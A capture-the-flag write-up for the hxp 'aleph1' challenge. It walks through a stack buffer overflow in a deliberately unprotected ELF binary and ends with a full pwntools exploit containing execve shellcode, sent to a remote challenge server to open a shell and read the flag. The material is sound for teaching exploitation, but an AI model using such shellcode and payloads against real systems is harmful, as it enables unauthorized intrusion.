## aleph1

Let's take a look at the elf:

```
$	file vuln
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=acfb044e627fb11294c7611f1b03a5387c04a72e, not stripped
$	pwn checksec vuln
[*] '/Hackery/hxp/bb/aleph1/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

So we can see that this is a 64 bit elf, with no stack canary, PIE, RELRO, and an executable stack abd RWX segments (Read, Writeable, Executable). In addition to that, the challenge stated that aslr was disabled on the challenge. Let's look at the source code for the program:

```
$	cat vuln.c 
#include <stdio.h>

int main()
{
    char yolo[0x400];
    fgets(yolo, 0x539, stdin);
}
```

So looking at this code, we can see that it simply scans in `0x539` bytes into a char array with only `0x400` bytes. It is clear that this is a buffer overflow vulnerabillity. Since ASLR is disabled, and there is an Executable Stack, we should be able to simply load shellcode into memory and call it. Since ASLR is disabled, we don't need an infoleak. We can just use gdb to find where our input is stored:

```
gdb-peda$ disas main
Dump of assembler code for function main:
   0x00000000004005ca <+0>:	push   rbp
   0x00000000004005cb <+1>:	mov    rbp,rsp
   0x00000000004005ce <+4>:	sub    rsp,0x400
   0x00000000004005d5 <+11>:	mov    rdx,QWORD PTR [rip+0x200a54]        # 0x601030 <stdin@@GLIBC_2.2.5>
   0x00000000004005dc <+18>:	lea    rax,[rbp-0x400]
   0x00000000004005e3 <+25>:	mov    esi,0x539
   0x00000000004005e8 <+30>:	mov    rdi,rax
   0x00000000004005eb <+33>:	call   0x4004d0 <fgets@plt>
   0x00000000004005f0 <+38>:	mov    eax,0x0
   0x00000000004005f5 <+43>:	leave  
   0x00000000004005f6 <+44>:	ret    
End of assembler dump.
gdb-peda$ b *main+38
Breakpoint 1 at 0x4005f0: file vuln.c, line 6.
gdb-peda$ r
Starting program: /Hackery/hxp/bb/aleph1/vuln 
15935728

[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffdb70 ("15935728\n")
RBX: 0x0 
RCX: 0xfbad2288 
RDX: 0x7fffffffdb70 ("15935728\n")
RSI: 0x7ffff7dd3770 --> 0x0 
RDI: 0x7fffffffdb71 ("5935728\n")
RBP: 0x7fffffffdf70 --> 0x400600 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffdb70 ("15935728\n")
RIP: 0x4005f0 (<main+38>:	mov    eax,0x0)
R8 : 0x602019 --> 0x0 
R9 : 0x7ffff7fd3700 (0x00007ffff7fd3700)
R10: 0x7ffff7dd1b58 --> 0x602410 --> 0x0 
R11: 0x246 
R12: 0x4004e0 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe050 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4005e3 <main+25>:	mov    esi,0x539
   0x4005e8 <main+30>:	mov    rdi,rax
   0x4005eb <main+33>:	call   0x4004d0 <fgets@plt>
=> 0x4005f0 <main+38>:	mov    eax,0x0
   0x4005f5 <main+43>:	leave  
   0x4005f6 <main+44>:	ret    
   0x4005f7:	nop    WORD PTR [rax+rax*1+0x0]
   0x400600 <__libc_csu_init>:	push   r15
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdb70 ("15935728\n")
0008| 0x7fffffffdb78 --> 0xa ('\n')
0016| 0x7fffffffdb80 --> 0x0 
0024| 0x7fffffffdb88 --> 0x0 
0032| 0x7fffffffdb90 --> 0x0 
0040| 0x7fffffffdb98 --> 0x7ffff7ffe4c0 --> 0x7ffff7ffe420 --> 0x7ffff7ff69c8 --> 0x7ffff7ffe168 --> 0x0 
0048| 0x7fffffffdba0 --> 0x7fffffffdcf0 --> 0x7ffff7ffe700 --> 0x7ffff7ffa000 (jg     0x7ffff7ffa047)
0056| 0x7fffffffdba8 --> 0x7ffff7ff6d58 --> 0x7ffff7dd77a9 ("GLIBC_2.2.5")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x00000000004005f0 in main () at vuln.c:6
6	    fgets(yolo, 0x539, stdin);
gdb-peda$ find 15935728
Searching for '15935728' in: None ranges
Found 2 results, display max 2 items:
 [heap] : 0x602010 ("15935728\n")
[stack] : 0x7fffffffdb70 ("15935728\n")
gdb-peda$ vmmap
Start              End                Perm	Name
0x00400000         0x00401000         r-xp	/Hackery/hxp/bb/aleph1/vuln
0x00600000         0x00601000         r-xp	/Hackery/hxp/bb/aleph1/vuln
0x00601000         0x00602000         rwxp	/Hackery/hxp/bb/aleph1/vuln
0x00602000         0x00623000         rwxp	[heap]
0x00007ffff7a10000 0x00007ffff7bce000 r-xp	/lib/x86_64-linux-gnu/libc-2.24.so
0x00007ffff7bce000 0x00007ffff7dcd000 ---p	/lib/x86_64-linux-gnu/libc-2.24.so
0x00007ffff7dcd000 0x00007ffff7dd1000 r-xp	/lib/x86_64-linux-gnu/libc-2.24.so
0x00007ffff7dd1000 0x00007ffff7dd3000 rwxp	/lib/x86_64-linux-gnu/libc-2.24.so
0x00007ffff7dd3000 0x00007ffff7dd7000 rwxp	mapped
0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp	/lib/x86_64-linux-gnu/ld-2.24.so
0x00007ffff7fd3000 0x00007ffff7fd5000 rwxp	mapped
0x00007ffff7ff5000 0x00007ffff7ff8000 rwxp	mapped
0x00007ffff7ff8000 0x00007ffff7ffa000 r--p	[vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp	[vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 r-xp	/lib/x86_64-linux-gnu/ld-2.24.so
0x00007ffff7ffd000 0x00007ffff7ffe000 rwxp	/lib/x86_64-linux-gnu/ld-2.24.so
0x00007ffff7ffe000 0x00007ffff7fff000 rwxp	mapped
0x00007ffffffde000 0x00007ffffffff000 rwxp	[stack]
0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
``` 

Here we can see that our input is stored at `0x602010`. With that we should be able to form a payload starting with shellcode, then the offset to the return address, then the address `0x602010` to call our shellcode. Let's find the offset to the return address.

```
Breakpoint 1, 0x00000000004005f0 in main () at vuln.c:6
6	    fgets(yolo, 0x539, stdin);
gdb-peda$ find 15935728
Searching for '15935728' in: None ranges
Found 2 results, display max 2 items:
 [heap] : 0x602010 ("15935728\n")
[stack] : 0x7fffffffdb70 ("15935728\n")
gdb-peda$ i f
Stack level 0, frame at 0x7fffffffdf80:
 rip = 0x4005f0 in main (vuln.c:6); saved rip = 0x7ffff7a303f1
 called by frame at 0x7fffffffe040
 source language c.
 Arglist at 0x7fffffffdf70, args: 
 Locals at 0x7fffffffdf70, Previous frame's sp is 0x7fffffffdf80
 Saved registers:
  rbp at 0x7fffffffdf70, rip at 0x7fffffffdf78
```

a bit of Python math:

```
>>> hex(0x7fffffffdf78 - 0x7fffffffdb70)
'0x408'
```

With that, we can see that the offset from the start of our input is `0x408` bytes. With this, we can write our exploit:

```
#Import pwntools
from pwn import *

#Establish the target process
#target = process('./vuln')
#gdb.attach(target)
target = remote("35.205.206.137", 1996)


#Establish the shellcode
shellcode = "\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"

#Write the payload
payload = shellcode + "0"*0x3f0 + p64(0x602010)

#Send the payload
target.sendline(payload)

#Drop to an interactive shell
target.interactive()
```

and when we run it:

```
$	python exploit.py 
[+] Opening connection to 35.205.206.137 on port 1996: Done
[*] Switching to interactive mode
$ ls
flag.txt
vuln
ynetd
$ cat flag.txt
hxp{Sm4sh1nG_tH3_sT4cK_L1k3_iT's_1996}
[*] Got EOF while reading in interactive
```

Just like that, we captured the flag.
